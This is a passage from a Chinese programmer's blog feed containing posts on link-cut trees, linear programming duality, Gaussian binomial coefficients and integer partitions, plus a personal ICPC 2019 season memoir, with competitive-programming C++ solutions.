class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    LCT lct;</span><br><span class="line">    <span class="built_in">set</span>&lt;pii&gt; edges;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">int</span> x; <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">        lct.newnode(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">int</span> op, u, v;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;op, &amp;u, &amp;v);</span><br><span class="line">        <span class="keyword">if</span>(op == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, lct.query(u, v));</span><br><span class="line">        &#125; <span class="keyword">if</span>(op == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(u &gt; v) swap(u, v);</span><br><span class="line">            <span class="keyword">if</span>(lct.findRoot(u) != lct.findRoot(v))</span><br><span class="line">                lct.link(u, v), edges.emplace(u, v);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(op == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(u &gt; v) swap(u, v);</span><br><span class="line">            <span class="keyword">if</span>(!edges.count(&#123;u, v&#125;)) <span class="keyword">continue</span>;</span><br><span class="line">            lct.cut(u, v);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(op == <span class="number">3</span>) &#123;</span><br><span class="line">            lct.modify(u, v);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div><p>时间复杂度分析：</p><p>$m$ 次操作，$h_v$ 的所有改变次数加起来是 $O(m\log n)$ 的。这是因为：<br>$$<br>\begin{aligned}<br>\text{changes in }h_v \leq &amp; \text{ preferred light edge created} + \<br>&amp; \text{ preferred heavy edge destroyed} +\<br>&amp; \text{ } n-1<br>\end{aligned}<br>$$</p><p>Access Lemma</p><p>轻重链剖分</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;加边，删边，询问之中怎料变幻无常；&lt;/p&gt;
&lt;p&gt;左旋，右旋，伸展背后暗含均摊平衡。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://yangdong2002.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>对偶线性规划学习笔记</title>
    <link href="http://yangdong2002.github.io/2020/02/21/%E5%AF%B9%E5%81%B6%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yangdong2002.github.io/2020/02/21/%E5%AF%B9%E5%81%B6%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-02-21T07:56:55.000Z</published>
    <updated>2020-03-25T16:57:30.333Z</updated>
    
    <content type="html"><![CDATA[<p>“这题对偶之后就是思博题！”</p><p>看似坚不可催，换个角度，柳暗花明。</p><span id="more"></span><p><a href="https://en.wikipedia.org/wiki/Dual_linear_program#cite_note-gm06-1">对偶线性规划的维基百科</a>。这篇博客将尽量讲清楚线性规划对偶问题背后的直观理解。</p><h1 id="线性规划对偶定理"><a href="#线性规划对偶定理" class="headerlink" title="线性规划对偶定理"></a>线性规划对偶定理</h1><h2 id="线性规划的概念"><a href="#线性规划的概念" class="headerlink" title="线性规划的概念"></a>线性规划的概念</h2><p>众所周知，线性规划 (Linear Programming, LP) 是运筹学一类应用广泛的重要分支。其标准型是：</p><p>$$<br>\begin{aligned}<br>\max_{\boldsymbol{x}} \boldsymbol{c}^T \boldsymbol{x}\<br>s.t. \boldsymbol{Ax} \leq \boldsymbol{b}\<br>\boldsymbol{x} \geq \boldsymbol{0}<br>\end{aligned}<br>$$</p><p>其中 $\boldsymbol{x}$ 称为变量，$\boldsymbol{A}$ 的每一行代表一个不等式限制。求解线性规划常用单纯型法，这里不展开叙述。很多常见问题都是线性规划的特例，如最大流、最小费用流、最短路等。</p><h2 id="对偶线性规划"><a href="#对偶线性规划" class="headerlink" title="对偶线性规划"></a>对偶线性规划</h2><p>线性规划对偶问题会将原规划的限制变成对偶规划的变量，把原规划变量变成对偶规划的限制。一般地，上面标准形的线性规划的对偶问题是：</p><p>$$<br>\begin{aligned}<br>\min_{\boldsymbol{y}} \boldsymbol{b}^T \boldsymbol{y}\<br>s.t. \boldsymbol{A^T y} \geq \boldsymbol{c}\<br>\boldsymbol{y} \geq \boldsymbol{0}<br>\end{aligned}<br>$$</p><p>然后就可以证明：</p><blockquote><p>强对偶定理：线性规划与对偶规划的答案是相同的，即 $\displaystyle\max_{\boldsymbol{x}} \boldsymbol{c^T} \boldsymbol x = \min_{\boldsymbol y} \boldsymbol{b^T y}$</p></blockquote><p>等等，为什么啊？我们先证明弱对偶定理，得到一些直观理解，<del>从而能够把公式背下来。</del></p><blockquote><p>弱对偶定理： $\displaystyle\max_{\boldsymbol{x}} \boldsymbol{c^T} \boldsymbol x \leq \min_{\boldsymbol y} \boldsymbol{b^T y}$</p></blockquote><p><strong>证明概要</strong>：我们考虑将 $Ax\leq b$ 代表的这些限制线性组合，如果组合之后得到的 $\boldsymbol{a^T x}$ 中， $a$ 的各个系数都不小于 $c$ 的，那么我们就得到了线性规划的一个上界。具体来说，假设我们是将 $A$ 第 $i$ 行乘以非负系数 $y_i$（不能是负的，否则不等号方向改变） ，然后把这些行向量相加就得到了 $\boldsymbol{a^T}$。如果满足 $\forall i, a_i \geq c_i$，那么 $\sum_{i} b_i y_i$ 就是答案的一个上界。如果把这些条见放在一起呢？实际上这就是最小化问题 $\min \boldsymbol{b^T y} \text{ }\  s.t. \boldsymbol{A^T y} \geq \boldsymbol{c}, \boldsymbol{y}\geq \boldsymbol{0}$，就是上面的对偶规划。</p><p>然后如何继续证明强对偶定理呢？这需要用到 KKT 条件，<a href="https://web.stanford.edu/~ashishg/msande111/notes/chapter4.pdf">这里抛出一篇理论教程</a>，此处留坑待填。</p><p>所以</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;“这题对偶之后就是思博题！”&lt;/p&gt;
&lt;p&gt;看似坚不可催，换个角度，柳暗花明。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="http://yangdong2002.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="线性规划" scheme="http://yangdong2002.github.io/tags/%E7%BA%BF%E6%80%A7%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>ICPC2019 回忆录</title>
    <link href="http://yangdong2002.github.io/2019/12/16/ICPC2019-%E5%9B%9E%E5%BF%86%E5%BD%95/"/>
    <id>http://yangdong2002.github.io/2019/12/16/ICPC2019-%E5%9B%9E%E5%BF%86%E5%BD%95/</id>
    <published>2019-12-16T05:20:28.000Z</published>
    <updated>2019-12-15T16:41:42.359Z</updated>
    
    <content type="html"><![CDATA[<p>最终，还是没能成为英雄呢。</p><p>这就算是，暂时退役了吗？</p><p>回忆起整个大一上的 ICPC 生涯，也是感慨万千呢。</p><span id="more"></span><h1 id="季尾结算"><a href="#季尾结算" class="headerlink" title="季尾结算"></a>季尾结算</h1><p>Team <strong>Dodo Kindergarten</strong> From Xi’an Jiao Tong University</p><ul><li>2019.10.12-13 CCPC 哈尔滨 Rank 3</li><li>2019.11.09-10 ICPC 南昌 Rank 20</li><li>2019.11.17-17 ICPC 沈阳 Rank 10</li><li>2019.12.14-15 ICPC EC Final Rank 10+</li></ul><p>没想到首战 CCPC 哈尔滨真的就成为了本赛季发挥最好的赛区。最后还是无缘 World Finals 了呢。回忆起整个大一上的 ICPC 生涯，也是感慨万千呢。</p><h1 id="吹响号角：暑期集训"><a href="#吹响号角：暑期集训" class="headerlink" title="吹响号角：暑期集训"></a>吹响号角：暑期集训</h1><p>2019年的暑假是我最忙碌的一个暑假。当时我们队伍已经确认下来了，而作为入坑时间较短、底子相对薄弱的选手，我也深知自己前进的道路任重道远。看到暑假网上举办的有牛客、杭电的多校训练赛，我便决定好好参加。7 月 18 日，我的暑假就结束了。回到学校，和业元一起一周参加四场训练，打比赛。每天我的生活就是临时宿舍-机房-食堂三点一线，想起来也算十分充实。每天我们都会尽力把前一天所有题目都搞懂，并且代码实现，忙得不亦乐乎，而最让我欣喜的是我也时常能 A 掉一些相对较难的题，以及在比赛中“捡漏”。而在坤上完托福课和我们一起打比赛时，在牛客多校取得的一次第五名更是使我们感到兴奋不已。通过自己的实力拿到了奖励的 bilibili 抱枕和购物卡，我们真是感觉开心极了~我们也因此把出线 World Finals 作为区域赛的一大目标。</p><p><img src="nowcoder.png"></p><h1 id="踏上征程：CCPC-哈尔滨"><a href="#踏上征程：CCPC-哈尔滨" class="headerlink" title="踏上征程：CCPC 哈尔滨"></a>踏上征程：CCPC 哈尔滨</h1><p>欢乐的暑假，轻松的军训终于结束，新学期开始了。新来的同学们许多都沉醉在这自由开放的新环境中，可是我们队可不能这样，要继续保持例行训练。转眼间就开始选赛区了，就要为了不和期中考试冲突，我们放弃了徐州与银川；由于香港动乱，自然没有考虑香港；由于一些原因以及数学竞赛，我们没有考虑南京。于是我们选择了南昌和沈阳，并且把和 CCPC Final 冲突的沈阳视为希望之花，视为保底赛区。在所有比赛之前，我们参加听说“高手如云”的 CCPC 哈尔滨站，对我们的实力找个定位。</p><p>9 月和 10 月，对我们来说一定就如同一部缤纷多彩的交响曲吧。坤拿到了托福超级高分，和我翘课在上海银联参加比赛，快乐旅游。我和业元参加了大学生数学竞赛，也意外地获得了一等奖。平时训练仿佛也是顺风顺水，哈尔滨之旅也颇有梦幻色彩。凌晨 4 点起来，换上羽绒服赶飞机，在东北林业大学博物馆参观，就连正式赛也是顺风顺水，多线程、高效率、完全没卡题的前三个半小时使我们坐稳了季军的位置，而最后一个半小时有两道题可以做，不幸由于我写挂了以及策略问题都没能通过。但这并没有影响这交响曲的主旋律：原来区域赛也没那么难！在首战捧杯的欢呼声，在五彩缤纷的交响曲中，我们踏上了征程。</p><h1 id="首度受挫：ICPC-南昌"><a href="#首度受挫：ICPC-南昌" class="headerlink" title="首度受挫：ICPC 南昌"></a>首度受挫：ICPC 南昌</h1><p>自哈尔滨之后，我们觉得在区域赛拿下奖杯也不是难事，坤表示只想尽快去打一场区域赛。可是，10 月终于还是过去了。南昌 ICPC，我们最终以 116 分钟离场、连卡三题的一片混乱中收场。</p><p>B 题简单问题复杂化，简单 dp ，甚至暴力可过，可是我却提出了网络流的奇慢无比的做法，最后荣获 TLE</p><p>K 题启发式合并，而我们却选择写极为麻烦的点分治做法，最后也没写完</p><p>D 题坤写了复杂度稍微有点高的做法，惨遭 TLE</p><p>赛后：A 题不是可撤销并查集裸题吗？M 题规律不是很显然，不是自然数幂次和裸题？可做题太多了，可是我们为什么会卡在这几道上，想用如此大常数的算法过题？我也成功打出了后期零贡献，也没有进行平常喜闻乐见的捡漏工作。</p><h1 id="魔鬼在人间：ICPC-沈阳"><a href="#魔鬼在人间：ICPC-沈阳" class="headerlink" title="魔鬼在人间：ICPC 沈阳"></a>魔鬼在人间：ICPC 沈阳</h1><p>经过一周的紧张训练，调整状态，我们又踏上了沈阳的旅途。</p><p>尽管发挥还算稳定，可是最后不明不白，就输了。各种偏题模板题，假题错题，算法导论原题遍布试题册。最后一题暴力可过，标程和假算法可过，可是我们吸取南昌教训，不愿写假算法。实际上回文级数的真做法也可以通过，可是当时不会。于是，尽管封榜后过了两题，我们仍然输在这一假题上。赛后复盘，我们认为由于当时我们不会回文级数，只要那道假题出现在试题中，就注定我们要输一道题或者输罚时。我们输在运气和科技上。</p><h2 id="最后一搏：EC-Final"><a href="#最后一搏：EC-Final" class="headerlink" title="最后一搏：EC Final"></a>最后一搏：EC Final</h2><p>终于，也只得来 EC 血拼出线名额了呢。</p><p>有很多强队，但这和我们发挥得怎样又有什么关系呢？</p><p>前期依然发挥稳定，还抢了签到题一血。</p><p>后期 D 较难写的 dp，G 麻烦模拟， J 小思维题。做出其中两道即可出线，可 D 题代码有小 bug，G 来不及改，J 又没仔细想，再次 148 分钟离场。</p><p>于是，ICPC2019，就这么结束了呢。</p><p>一周以来，我都仿佛不在状态。看到 EC 的结果，我也仿佛早已预料到一般，不知道现在自己是一种什么心态。我个人的问题究竟出在哪儿了呢？水平低，过于依赖队友。在逆风条件下没有想题能力，代码水平也不够。检查代码不仔细。我发现逆风时，我经常会处于不自信状态，不由自主地思想弃疗，总觉得题目很麻烦而不去想怎么做，总觉得自己做不出来。</p><p>提高水平，自然就可以提高自信。</p><p>ICPC2019 赛季，终究还是结束了。由于期末临近，终于还是要和 ICPC 暂别了。明年六月，只能仰望各大强队在 WF 的精彩表现了。</p><p>但是，从哪里跌倒，就从哪里爬起来。人在这里，信心还有，希望还在！ICPC2020 ，拭目以待！</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最终，还是没能成为英雄呢。&lt;/p&gt;
&lt;p&gt;这就算是，暂时退役了吗？&lt;/p&gt;
&lt;p&gt;回忆起整个大一上的 ICPC 生涯，也是感慨万千呢。&lt;/p&gt;</summary>
    
    
    
    <category term="游记" scheme="http://yangdong2002.github.io/categories/%E6%B8%B8%E8%AE%B0/"/>
    
    
    <category term="ICPC" scheme="http://yangdong2002.github.io/tags/ICPC/"/>
    
  </entry>
  
  <entry>
    <title>高斯二项式系数小结</title>
    <link href="http://yangdong2002.github.io/2019/09/04/%E9%AB%98%E6%96%AF%E4%BA%8C%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%B0%8F%E7%BB%93/"/>
    <id>http://yangdong2002.github.io/2019/09/04/%E9%AB%98%E6%96%AF%E4%BA%8C%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0%E5%B0%8F%E7%BB%93/</id>
    <published>2019-09-03T17:51:12.000Z</published>
    <updated>2019-12-15T14:14:31.230Z</updated>
    
    <content type="html"><![CDATA[<p>高斯二项式系数是二项式系数的 “q-analog” ，对于处理求所有排列逆序数指数和的问题往往可以产生“降维打击”的效果。</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在牛客多校训练赛 9 中，我们队第一次遇到了高斯二项式系数的题目，当时并没有学过相关的理论，cyy 用一种高级的 dp 过掉了那道题。看到题解上“高斯二项式系数”这个名词之后，我们就学习了一番。之后又碰到了一道 Opencup 题，发现它正是 01 序列所有排列逆序对指数之和这一问题，于是很快在前中期秒杀了。看到题解的朴素 dp 的方法，顿时感觉这一工具的强大，这里做一总结。<a href="https://en.wikipedia.org/wiki/Gaussian_binomial_coefficient">维基百科链接</a></p><h1 id="定义与性质"><a href="#定义与性质" class="headerlink" title="定义与性质"></a>定义与性质</h1><p><strong>定义1</strong> 定义 q number 如下：<br>$$<br>[k]<em>q = \sum</em>{0\leq i &lt; k} q^i = 1+q+q^2+\ldots+q^{k-1} = \begin{cases} \frac{1-q^k}{1-q} &amp; q \neq 1,\<br>k &amp; q = 1<br>\end{cases}<br>$$</p><p><strong>定义2</strong> 定义高斯二项式系数如下：<br>$$<br>\binom{m}{r}_q = \frac{[m]_q [m-1]_q \cdots [m-r+1]_q}{[1]_q [2]_q \cdots [r]_q} \text{ }(r \leq m)<br>$$<br>一种等价定义如下，不过好像没有什么用：<br>$$<br>{m \choose r}_q<br>= \begin{cases}<br>\frac{(1-q^m)(1-q^{m-1})\cdots(1-q^{m-r+1})} {(1-q)(1-q^2)\cdots(1-q^r)} &amp; r \le m \<br>0 &amp; r&gt;m \end{cases}<br>$$<br>类似组合数，可以定义 q factorial 如下：<br>$$<br>[n]_q! = [1]_q [2]_q \cdots [n]_q<br>$$<br>这样，我们就有一个漂亮简洁、易于编程的类似组合数的高斯二项式系数公式了：<br>$$<br>\binom nr _q = \frac {[n]_q!}{[r]_q! [n-r]_q!}<br>$$</p><p><strong>例子</strong><br>$$<br>{0 \choose 0}_q = {1 \choose 0}_q = 1<br>$$</p><p>$$<br>{m \choose 0}_q = {m \choose m}_q =1<br>$$</p><p>$$<br>{4 \choose 2}_q = \frac{[4]_q[3]_q}{[1]_q[2]_q} = \frac{(1+q+q^2+q^3)(1+q+q^2)}{1\cdot (1+q)}=(1+q^2)(1+q+q^2)=1+q+2q^2+q^3+q^4<br>$$</p><p><strong>性质1</strong> （高斯二项式系数的组合意义）考虑 $n$ 个数组成的数列，其中有 $r$ 个 1 ，$n-r$ 个 0，那么组成的数列恰好有 $d$ 个逆序对数的方案数就是关于 $q$ 的多项式 $\displaystyle \binom nr _q = \frac {[n]_q!}{[r]_q! [n-r]_q!}$ 的 $q^d$ 项系数。</p><p>例如：$m=4,r=2$ 时，$\displaystyle \binom 42_q = 1+q+2q^2+q^3+q^4$ ，而 0011 的 6 种排列恰好有 1,1,2,1,1 种方式逆序数分别为 0,1,2,3,4。</p><p>性质 1 就是解决很多题目的利器。最典型的题目就是下面的了：给定长度为 $n$ 的 01 序列 $a$ ，记序列 $a$ 的所有排列的集合为 $F(a)$，序列 $b$ 的逆序对数为 $r(b)$ ，求 $\displaystyle \sum_{b \in F(a)} q^{r(b)}$ ，答案直接就是高斯二项式系数。</p><p>可是如果序列 $a$ 不止有 01 这两种元素，怎么办呢？我们有下面的推广：</p><p><strong>性质1‘</strong> （多重高斯二项式系数）设 $a$ 是由 $n$ 个数组成的数列，假设 $a$ 中有 $m$ 种元素，其中元素 $x_i$ 有 $c_i$ 个 $(1\leq i \leq m)$。类比组合数与多重组合数的关系，答案就是下面的“多重”高斯二项式系数：<br>$$<br>\binom{n}{c_1,c_2,\cdots,c_m} = \frac{[n]_q!}{[c_1]_q! [c_2]_q! \cdots [c_m]_q!}<br>$$<br>值得一提的是，在这个公式里，我们只关心 $c_i$ 的大小，而不关心 $x_i$ 的取值、大小关系等等。</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="Inversions-of-all-permutations"><a href="#Inversions-of-all-permutations" class="headerlink" title="Inversions of all permutations"></a>Inversions of all permutations</h2><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><p>给定任意可重序列 $a$ ，记序列 $a$ 的所有排列的集合为 $F(a)$，序列 $b$ 的逆序对数为 $r(b)$ ，求 $\displaystyle \sum_{b \in F(a)} q^{r(b)}$ 。</p><p>题目来源：<a href="https://ac.nowcoder.com/acm/contest/889/C">2019牛客暑期多校训练营（第九场）</a> </p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>直接使用性质 1b 即可，复杂度 $O(n\log n)$。</p><blockquote><p><strong>性质1b</strong> （多重高斯二项式系数）设 $a$ 是由 $n$ 个数组成的数列，假设 $a$ 中有 $m$ 种元素，其中元素 $x_i$ 有 $c_i$ 个 $(1\leq i \leq m)$。类比组合数与多重组合数的关系，答案就是下面的“多重”高斯二项式系数：</p><p>$$<br>\binom{n}{c_1,c_2,\cdots,c_m} = \frac{[n]_q!}{[c_1]_q! [c_2]_q! \cdots [c_m]_q!}<br>$$</p></blockquote><h2 id="Do-I-Wanna-Know"><a href="#Do-I-Wanna-Know" class="headerlink" title="Do I Wanna Know"></a>Do I Wanna Know</h2><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><p>有 $n$ 只编号分别为 $1,2,\ldots,n$ 的猴子两两打架，任意编号小的猴子打赢编号大的猴子的概率均为 $p$ ，输掉概率均为 $q=1-p$ 。问对于所有 $k=1,2,\ldots,n-1$ ，下面的局面出现的概率是多少：存在方案可以将猴子分为包含 $k$ 只猴子的强者组和包含 $n-k$ 只的弱者组，使得强者组的每只猴子都打赢了弱者组的每只猴子。</p><h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>显然如果存在，那么强者组的选取是唯一的。将强猴子记为1，弱猴子记为 0 ，对每个 k 相当于求 k 个 1 与 $n-k$ 个 0 的所有排列出现概率之和。考虑如果给定一种排列 $P$，记其逆序数为 $c$ ，那么它出现的概率就是 $p^c q^{k(n-k) - c}$ 。将这个式子求和，整理得到：<br>$$<br>q^{k(n-k)}\sum_{b \in F(a)} (\frac pq )^{r(b)} = q^{k(n-k)} \binom{n}{k}_\frac pq<br>$$</p><div><div class="fold_hider"><div class="close hider_title">点击显示/隐藏代码</div></div><div class="fold"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Author       : YangDavid</span></span><br><span class="line"><span class="comment"> * Created Time : 2019年09月03日 星期二 14时03分22秒</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, n) for(int i = 1; i &lt;= n; ++i)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> eprintf(...) fprintf(stderr, __VA_ARGS__)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">666666</span>, MOD = <span class="number">998244353</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">muln</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> <span class="number">1LL</span> * x * y % MOD; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qpow</span><span class="params">(<span class="keyword">int</span> x, ll y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(; y; y &gt;&gt;= <span class="number">1</span>, x = muln(x, x))</span><br><span class="line">        <span class="keyword">if</span>(y &amp; <span class="number">1</span>) ret = muln(ret, x);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inv</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="keyword">return</span> qpow(x, MOD - <span class="number">2</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x+y&gt;=MOD ? x+y-MOD : x+y; &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="keyword">return</span> x-y&lt;<span class="number">0</span> ? x-y+MOD : x-y; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> qn[maxn], iqn[maxn];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, a, b, p, q, r, g = <span class="number">1</span>, ans = <span class="number">0</span>, binom = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;a, &amp;b);</span><br><span class="line">    p = muln(a, inv(b)), q = sub(<span class="number">1</span>, p), r = muln(p, inv(q));</span><br><span class="line">    qn[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        qn[i] = add(muln(qn[i - <span class="number">1</span>], r), r);</span><br><span class="line">        iqn[i] = inv(qn[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">1</span>; k &lt; n; ++k) &#123;</span><br><span class="line">        binom = muln(binom, muln(qn[n - k + <span class="number">1</span>], iqn[k]));</span><br><span class="line">        ans = add(ans, muln(muln(qpow(q, <span class="number">1LL</span>*k*(n-k)), binom), g));</span><br><span class="line">        g = add(muln(g, g), <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div>]]></content>
    
    
    <summary type="html">&lt;p&gt;高斯二项式系数是二项式系数的 “q-analog” ，对于处理求所有排列逆序数指数和的问题往往可以产生“降维打击”的效果。&lt;/p&gt;</summary>
    
    
    
    <category term="数学" scheme="http://yangdong2002.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="高斯二项式系数" scheme="http://yangdong2002.github.io/tags/%E9%AB%98%E6%96%AF%E4%BA%8C%E9%A1%B9%E5%BC%8F%E7%B3%BB%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>整数拆分知识集锦</title>
    <link href="http://yangdong2002.github.io/2019/07/12/%E6%95%B4%E6%95%B0%E6%8B%86%E5%88%86%E7%9F%A5%E8%AF%86%E9%9B%86%E9%94%A6/"/>
    <id>http://yangdong2002.github.io/2019/07/12/%E6%95%B4%E6%95%B0%E6%8B%86%E5%88%86%E7%9F%A5%E8%AF%86%E9%9B%86%E9%94%A6/</id>
    <published>2019-07-11T22:38:09.000Z</published>
    <updated>2019-12-15T14:13:41.404Z</updated>
    
    <content type="html"><![CDATA[<p>如果看到了下面的数列，就要保持警惕了！！！</p><p><code>1, 1, 2, 3, 5, 7, 11, 15, 22, 30</code></p><span id="more"></span><h1 id="有关整数拆分"><a href="#有关整数拆分" class="headerlink" title="有关整数拆分"></a>有关整数拆分</h1><p>如果看到了下面的数列，就要保持警惕了！！！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1, 1, 2, 3, 5, 7, 11, 15, 22, 30, 42, 56, 77, 101, 135, 176, 231, 297, 385, 490, 627, 792, 1002, 1255, 1575, 1958, 2436, 3010, 3718, 4565, 5604, 6842, 8349, 10143, 12310, 14883, 17977, 21637, 26015, 31185, 37338, 44583, 53174, 63261, 75175, 89134, 105558, 124754, 147273, 173525</span><br></pre></td></tr></table></figure><p>首先，是整数拆分的定义。</p><p><strong>定义1</strong> 给定 $n$，求不同数组 $\displaystyle (a_{1},a_{2},…,a_{k})$ 的数目，符合下面的条件：</p><ol><li>${\displaystyle a_{1}+a_{2}+…+a_{k}=n}$ （${\displaystyle k}$ 的大小不定）</li><li>${\displaystyle a_{1}\geq a_{2}\geq …\geq a_{k}&gt;0}$</li><li>其他附加条件（例如限定“k是偶数”，或“${\displaystyle a_{i}}$ 不是 1 就是 2 ”等）</li></ol><p><strong>分割函数</strong> $p(n)$ 是求符合以上第一、二个条件的数组数目。为了方便起见，我们首先讨论的是忽略条件 3 的情况。</p><p>引理1：<br>$$<br>\varphi(x) = \prod_{i=1}^\infty (1-x^i)<br>$$<br>引理2：设 $f(x) = \text{(将}x\text{分成偶数个不同正整数的方法数)} - \text{(将}x\text{分成奇数个不同正整数的方法数)}$ ，则 $f$ 的生成函数 $F(x)$ 就是：<br>$$<br>F(x) = \prod_{i=1}^\infty (1-x^i)<br>$$<br>定理1：<br>$$<br>\varphi(x) = \prod <em>{i=1}^\infty (1-x^i) = \sum</em>{k=-\infty}^\infty (-1)^k x^{\frac{k(3k-1)}{2}}<br>$$<br>证明：根据引理2 的组合意义进行证明。考虑划分的 Ferrers 图，我们构造一种配对方案，将大部分 Ferrers 图两两配对（数学上又称这种方法为构造一个 involution，即满足 $f(f(x)) = x$  的函数）。详见 wiki (<a href="https://en.wikipedia.org/wiki/Pentagonal_number_theorem)%E3%80%82">https://en.wikipedia.org/wiki/Pentagonal_number_theorem)。</a></p><p>一些性质：</p><ol><li>分拆成若干奇数的方案数 = 分拆成若干互不相同的数的方案数</li><li>Ferrers 